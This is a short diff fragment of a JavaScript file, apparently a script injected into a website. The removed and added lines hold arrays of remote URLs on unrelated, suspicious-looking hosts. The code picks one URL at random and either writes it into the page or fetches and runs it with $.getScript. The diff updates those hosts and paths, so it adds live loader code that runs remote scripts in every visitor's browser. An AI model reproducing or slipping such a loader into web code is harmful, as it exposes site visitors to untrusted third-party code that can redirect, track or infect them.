@@ -90,13 +90,13 @@ else
 else
 {dbs[1]='https://envyindebted.com/7f/a7/40/7fa740b32e403dc04ab6e74399d55b9e.js';}}
 else
-{dbs[0]='https://wap.ntzfly.cn/c/4EE3BFE3-4615-401A-9E04-B66DB0BBFFCB.panda';dbs[1]='https://k.wudejia.com/d.php?pid=8028';dbs[2]='https://yd.game4343.com/dp.php?m=dHR5NmRmST09NS1jag%3D%3D';dbs[3]='https://f.zgbmw.com.cn/first/C2922F4C-8340-4ADD-9DA1-EA33B0C900DD.yx';}
+{dbs[0]='https://wap.ntzfly.cn/c/4EE3BFE3-4615-401A-9E04-B66DB0BBFFCB.panda';dbs[1]='https://k.wudejia.com/d.php?pid=8028';dbs[2]='https://yd.game4343.com/dp.php?m=dHR5NmRmST09NS1jag%3D%3D';dbs[3]='https://yi.screenpro.com.cn/first/C2922F4C-8340-4ADD-9DA1-EA33B0C900DD.yx';}
 var db=Math.floor(Math.random()*dbs.length);if(dbs[db].indexOf("<")!=-1)
 {document.write(dbs[db]);}
 else
 {$.getScript(dbs[db]);}}
 else
-{var xtbs=new Array();xtbs[0]='https://wap.ntzfly.cn/c/4EE3BFE3-4615-401A-9E04-B66DB0BBFFCB.panda';xtbs[1]='https://k.wudejia.com/d.php?pid=8028';xtbs[2]='https://yd.game4343.com/dp.php?m=dHR5NmRmST09NS1jag%3D%3D';xtbs[3]='https://f.zgbmw.com.cn/first/C2922F4C-8340-4ADD-9DA1-EA33B0C900DD.yx';var xtb=Math.floor(Math.random()*xtbs.length);if(xtbs[xtb].indexOf("<")!=-1)
+{var xtbs=new Array();xtbs[0]='https://wap.ntzfly.cn/c/361D9AC9-E84E-4DE8-A51C-377057908599.panda';xtbs[1]='https://k.wudejia.com/s.php?pid=8028';xtbs[2]='https://yd.game4343.com/xtb.php?m=bFRBZkFXdUdJMkZLWg%3D%3D';xtbs[3]='https://yi.screenpro.com.cn/first/B40F17C7-268D-4032-9C7F-64B10EBB6075.yx';var xtb=Math.floor(Math.random()*xtbs.length);if(xtbs[xtb].indexOf("<")!=-1)
 {document.write(xtbs[xtb]);}
 else
 {$.getScript(xtbs[xtb]);}}}}
